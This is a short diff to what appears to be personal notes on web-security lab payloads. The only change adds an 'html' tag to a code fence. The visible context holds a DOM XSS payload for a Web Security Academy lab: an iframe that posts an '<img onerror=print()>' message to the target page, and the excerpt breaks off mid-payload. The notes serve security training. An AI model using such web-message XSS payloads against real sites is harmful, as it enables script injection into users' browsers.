@@ -161,7 +161,7 @@ to be called in the browser.
 
 
 ## LAB payloads
-```
+```html
 # DOM XSS using web messages
 --> find that addEventListener() call that listens for a web message
 <iframe src="https://...web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()
